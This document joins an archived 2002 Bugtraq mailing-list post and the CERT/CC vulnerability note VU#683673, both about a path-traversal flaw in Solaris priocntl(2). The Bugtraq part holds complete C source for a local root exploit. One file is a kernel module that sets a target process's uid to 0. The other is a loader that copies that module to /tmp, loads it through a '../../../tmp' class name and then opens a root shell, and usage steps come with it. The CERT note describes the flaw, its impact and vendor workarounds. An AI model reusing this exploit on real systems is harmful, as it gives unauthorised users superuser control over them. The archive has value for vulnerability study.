=== Content from marc.info_648fad67_20250126_004800.html ===

```
[[prev in list](?l=bugtraq&m=103849898631905&w=2)] [[next in list](?l=bugtraq&m=103841778824795&w=2)] [prev in thread] [[next in thread](?l=bugtraq&m=103843524614447&w=2)]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    [Solaris priocntl exploit](?t=103842630300005&r=1&w=2)
From:       ["=?GB2312?Q?=DD=FE=D2=E3=C1=88?=" <kk_qq () 263 ! net>](?a=103842622300004&r=1&w=2)
Date:       [2002-11-27 3:00:11](?l=bugtraq&r=1&w=2&b=200211)
[Download RAW [message](?l=bugtraq&m=103842619803173&q=mbox) or [body](?l=bugtraq&m=103842619803173&q=raw)]

** Moderator note:

Messages with links to technical details outside of the message are not approved.
Because of the potential delay waiting for another submission, the original message
has been modified to include the details.

Details follow:

Solaris's Got Big problem on System Call priocntl()

Description
syscall priocntl(2) is used as process scheduler control
it's declared as below:

long priocntl(idtype_t idtype, id_t id, int cmd, /* arg */ ...);

while set 'cmd' arg to PC_GETCID, priocntl()'s function is like below
(see ManPage 'man -s 2 priocntl')
"Get class ID and class attributes for a specific class
given class name. The idtype and id arguments are
ignored. If arg is non-null, it points to a structure
of type pcinfo_t. The pc_clname buffer contains the
name of the class whose attributes you are getting."

as it said, pc_clname points to a string specify the module.
priocntl() will load the module without any privilege check.
The module's name is a relative path, priocntl will search the module file
in only /kernel/sched and /usr/kernel/sched/ dirs.
but unfortunately, priocntl() never check '../' in pc_clname arg
we can use '../../../tmp/module' to make priocntl() load a module from anywhere

For more detail, read the sources.
flkm.c the module source
final.c the loader source

How to Use?

1.Extract release.tgz to a folder
2.use "isainfo -b" to know what platform is running
3.under 32-bit solaris, execute "./final"
under 64-bit solaris, execute "./final 64"

Any Question?
contact support@catdogsoft.com

** End Moderator note

detailes on <http://www.catdogsoft.com/S8EXP/>

--------flkm.c-----------------------------
/*
 Writen By CatDog
 the module find the user's proccess's cred struct
 change it's owner uid to 0(root)
 this code can work properly in any conditions
*/
#include <sys/systm.h>
#include <sys/ddi.h>
#include <sys/sunddi.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/kmem.h>
#include <sys/errno.h>
#include <sys/proc.h>
#include <sys/user.h>
#include <sys/thread.h>
#include <sys/cred.h>
#include <vm/as.h>
#include <vm/seg.h>
#include <vm/seg_vn.h>

typedef unsigned int DWORD;

DWORD   ptree[[20]](#20)={0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,
                                 0xffffffff,0xffffffff,0xffffffff,
                                 0xffffffff,0xffffffff,0xffffffff,
                                 0xffffffff,0xffffffff,0xffffffff};
/*
 * This is the loadable module wrapper.
 */
#include <sys/modctl.h>

int _info(struct modinfo *modinfop)
{
    return -1;
}

int _init(void)
{
    proc_t *current,*pp;
    pid_t rec;
    int i,cnt;

    for(i=0;ptree[i]!=0xffffffff;i++);
    cnt=i;

cmn_err(CE_NOTE ,"Get Su: cnt=%d", cnt);

    current=curproc;
    while(current->p_pidp->pid_id!=0) current=current->p_parent;

    pp=current;

    for(i=0;i<cnt;i++) {
        pp=pp->p_child;
cmn_err(CE_NOTE ,"Get Su: search pid=%d", ptree[i]);
        while(pp!=0)  {
            if(pp->p_pidp->pid_id==ptree[i])  break;
            pp=pp->p_sibling;
        }
        if(pp==0) goto ERR;
    }

    if(pp!=0) {
        pp->p_cred->cr_ruid=0;
        pp->p_cred->cr_uid=0;
        cmn_err(CE_NOTE ,"Get Su: %d", pp->p_pidp->pid_id);
        cmn_err(CE_NOTE ,"Get Su: %d", pp->p_cred->cr_ruid);
        cmn_err(CE_NOTE ,"Get Su: %d", pp->p_cred->cr_uid);
    }

ERR:
    cmn_err(CE_NOTE ,"Get Su: not found");
    return -1;
}

--------end of flkm.c-----------------------

--------final.c-----------------------------
/*
 Writen By CatDog
 the module find the user's proccess's cred struct
 change it's owner uid to 0(root)
 this code can work properly in any conditions
*/

#include <stdio.h>
#include <sys/types.h>
#include <procfs.h>
#include <unistd.h>

#include <errno.h>
#include <sys/priocntl.h>
#include <sys/rtpriocntl.h>
#include <sys/tspriocntl.h>

#define OFFSET 0x2dc
#define OFFSET64 0x39c

pid_t getpppid(pid_t pid)
{
    	psinfo_t psinf;
    	int fd;
    	char buf[256];

    	sprintf(buf, "/proc/%d/psinfo", pid);
    	fd=open(buf,0);
	if(fd!=-1) {
		read(fd, &psinf, sizeof(psinfo_t));
		close(fd);
    	}

	return psinf.pr_ppid;
}

void Load(int m64)
{
    pcinfo_t pcinfo;
    if(!m64)
    	strcpy(pcinfo.pc_clname, "../../../tmp/flkm32");
    if(m64)
    	strcpy(pcinfo.pc_clname, "../../../tmp/flkm64");

	priocntl(0,getpid(),PC_GETCID,(caddr_t)&pcinfo);
}

main(int argc,char *argv[])
{
	pid_t pid;
	pid_t ptree[[20]](#20), *pptree;
	int i,j,k;
	int fd;
	int m64=0;

	if(argc==2) {
		if(atoi(argv[[1]](#1))==64) m64=1;
	}

	printf("is 64 bit: %d\n",m64);

	pid=getpid();
	memset(ptree, 0, 20*sizeof(pid_t));

	ptree[[0]](#0)=pid;
	for(i=1;i<20;i++) {
		pid=getpppid(pid);
		if(pid==0) break;
		ptree[i]=pid;
	}
	pptree=(pid_t *)malloc((i+1)*sizeof(pid_t));

	k=0;
	for(j=19;j>=0;j--) {
		if(ptree[j]==0) continue;
		//printf("%d %x\n", ptree[j], ptree[j]);
		pptree[k]=ptree[j];
		k++;
	}
	pptree[k]=0xffffffff;

	if(!m64) system("cp -f flkm32 /tmp/flkm32");
	if(m64) mkdir("/tmp/sparcv9",0777);
	if(m64) system("cp -f flkm64 /tmp/sparcv9/flkm64");

	if(!m64) fd=open("/tmp/flkm32",2);
	if(m64)	fd=open("/tmp/sparcv9/flkm64",2);

	if(fd!=-1){
		if(!m64) lseek(fd, OFFSET, SEEK_SET);
		if(m64)	lseek(fd, OFFSET64, SEEK_SET);
		printf("%d bytes to write\n", i*sizeof(pid_t));
		k=write(fd, pptree, i*sizeof(pid_t));
		printf("%d bytes wroten\n", k);
		close(fd);
	}else{
		printf("err! open flkm error!\n");
		exit(-1);
	}
	free(pptree);

	Load(m64);
	printf("id=%d\n", k=getuid());

	if(!m64) {
		system("rm -fr /tmp/flkm32");
	}
	if(m64) {
		system("rm -fr /tmp/sparcv9");
	}

	if(k==0) {
		printf("SUCCESS! Enjoy RootShell!\n");
		execl("/bin/sh","sh",NULL);
	}else{
		printf("fail!\n");
	}
}

--------end of final.c-------------------------
University of Science and Technology of China

[[prev in list](?l=bugtraq&m=103849898631905&w=2)] [[next in list](?l=bugtraq&m=103841778824795&w=2)] [prev in thread] [[next in thread](?l=bugtraq&m=103843524614447&w=2)]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from www.kb.cert.org_7289ee08_20250126_004836.html ===


search

menu

icon-carat-right

cmu-wordmark

* ×
* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

[[Carnegie Mellon University](https://www.cmu.edu)](https://www.cmu.edu/)

# [Software Engineering Institute](https://www.sei.cmu.edu/)

## CERT Coordination Center

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* Current:  VU#683673

## Sun Solaris priocntl(2) does not adequately validate path to kernel modules that implement lightweight process (LWP) scheduling policy

#### Vulnerability Note VU#683673

Original Release Date: 2002-12-05 | Last Revised: 2002-12-06

---

### Overview

The Sun Solaris [priocntl(2)](http://docs.sun.com/db/doc/816-0212/6m6nd4ncg?a=view) function does not adequately validate a memory structure that specifies the name of a kernel module. As a result, a local attacker could execute arbitrary code with superuser privileges on a vulnerable system.

### Description

| The Sun Solaris priocntl(2) function provides the ability to control the scheduling of lightweight processes (LWPs). LWPs are grouped into several classes, each class having a different scheduling policy. The priocntl(2) command PC\_GETCID can be used to get the class ID and attributes for a class of LWPs. The PC\_GETCID command can take as an argument a pointer to a structure of type pcinfo\_t that contains information about the class. A pcinfo\_t structure includes a member called pc\_clname that specifies the name of the class, and in certain cases, the name of a kernel module that implements the process scheduling policy for the class. priocntl(2) searches for the kernel module specified by pc\_clname in /kernel/sched and /usr/kernel/sched.  priocntl(2) does not adequately validate the data in pc\_clname. As demonstrated by the exploit code posted to the [BugTraq](http://online.securityfocus.com/archive/1) mailing list, an attacker with local user privileges can:   1. create an arbitrary kernel module and place it in a writable location (/tmp/module for instance), 2. create an arbitrary pcinfo\_t structure with pc\_clname set to the location of the kernel module relative to /usr/kernel/sched (../../../tmp/module), and 3. issue a priocntl(2) call using the PC\_GETCID command and a pointer to the pcinfo\_t structure created by the attacker.  Since priocntl(2) accepts the relative path operators (../) in pc\_clname, the attacker-supplied module will be loaded by the kernel, and the attacker can act with superuser privileges.A different aspect of this vulnerability is that priocntl(2) does not validate or authenticate the kernel module that is being loaded. A [message](http://online.securityfocus.com/archive/1/301845/2002-12-01/2002-12-07/0) posted to BugTraq suggests checking the permissions ownership of the module and its parent directories. Another option could be to check a cryptographic hash or signature before loading a module. |
| --- |

### Impact

| A local attacker could execute code with superuser privileges. |
| --- |

### Solution

| **Apply Patch or Upgrade**Sun Alert ID [49131](http://sunsolve.Sun.COM/pub-cgi/retrieve.pl?doc=fsalert/49131) states that "A final resolution is pending completion." |
| --- |

| **Change Location of** **/sched** **Directories**Sun Alert ID [49131](http://sunsolve.Sun.COM/pub-cgi/retrieve.pl?doc=fsalert/49131) includes a workaround that involves nesting the /sched directories deeply enough that they cannot be traversed in the space available in pc\_clname. |
| --- |

### Vendor Information

683673
Filter by status:
All
Affected
Not Affected
Unknown

Filter by content:
 Additional information available

 Sort by:
Status
Alphabetical

Expand all

**Javascript is disabled. Click [here](/vuls/vendor/VU%23683673/) to view vendors.**
### [Sun Microsystems Inc.](#AAMN-5GHPG4) Affected

Notified:  December 02, 2002  Updated: December 05, 2002

### Status

Affected

### Vendor Statement

Sun confirms that the priocntl(2) vulnerability does affect all currently supported versions of Solaris:

Solaris 2.6, 7, 8, and 9

Sun has released a Sun Alert which describes a workaround until patches are available at:

<http://sunsolve.Sun.COM/pub-cgi/retrieve.pl?doc=fsalert/49131>

The Sun Alert will be updated with the patch information once it becomes available. Sun patches are available from:

<http://sunsolve.sun.com/securitypatch>

### Vendor Information

The vendor has not provided us with any further information regarding this vulnerability.

### Addendum

The CERT/CC has no additional comments at this time.

If you have feedback, comments, or additional information about this vulnerability, please send us email.

### CVSS Metrics

| Group | Score | Vector |
| --- | --- | --- |
| Base |  |  |
| Temporal |  |  |
| Environmental |  |  |

### References

* <http://sunsolve.Sun.COM/pub-cgi/retrieve.pl?doc=fsalert/49131>
* <http://docs.sun.com/db/doc/816-0212/6m6nd4ncg?a=view>
* <http://www.sun.com/security/blueprints/>
* <http://online.securityfocus.com/bid/6262>
* <http://online.securityfocus.com/archive/1/301400/2002-11-24/2002-11-30/0>
* <http://www.iss.net/security_center/static/10717.php>
### Acknowledgements

This vulnerability was publicly reported by CatDog.

This document was written by Art Manion.

### Other Information

| **CVE IDs:** | [CVE-2002-1296](http://web.nvd.nist.gov/vuln/detail/CVE-2002-1296) |
| --- | --- |
| **Severity Metric:** | 20.48 |
| **Date Public:** | 2002-11-27 |
| **Date First Published:** | 2002-12-05 |
| **Date Last Updated:** | 2002-12-06 17:12 UTC |
| **Document Revision:** | 45 |

* [About vulnerability notes](https://vuls.cert.org/confluence/display/VIN/Vulnerability%2BNote%2BHelp)
* Contact us about this vulnerability
* [Provide a vendor statement](https://vuls.cert.org/confluence/display/VIN/Case%2BHandling#CaseHandling-Givingavendorstatusandstatement)

Sponsored by [CISA.](https://www.cisa.gov/cybersecurity)

 [Download PGP Key](https://vuls.cert.org/confluence/pages/viewpage.action?pageId=25985026)

[Read CERT/CC Blog](https://insights.sei.cmu.edu/cert/)

[Learn about Vulnerability Analysis](https://www.sei.cmu.edu/research-capabilities/all-work/display.cfm?customel_datapageid_4050=21304)

Carnegie Mellon University

Software Engineering Institute

4500 Fifth Avenue

Pittsburgh, PA 15213-2612

412-268-5800

[Office Locations](http://www.sei.cmu.edu/locations/index.cfm) | [Additional Sites Directory](http://www.sei.cmu.edu/additional-sites-directory/index.cfm) | [Legal](https://vuls.cert.org/confluence/display/VIN/VINCE%2BCode%2Bof%2BConduct#VINCECodeofConduct-TermsofUse) | [Privacy Notice](https://www.sei.cmu.edu/legal/privacy-notice/index.cfm) | [CMU Ethics Hotline](https://www.cmu.edu/hr/ethics-hotline/) | [www.sei.cmu.edu](http://www.sei.cmu.edu)

Â©2022 Carnegie Mellon University

[Contact SEI](https://www.sei.cmu.edu/contact-us/)
#### Contact CERT/CC

 412-268-5800


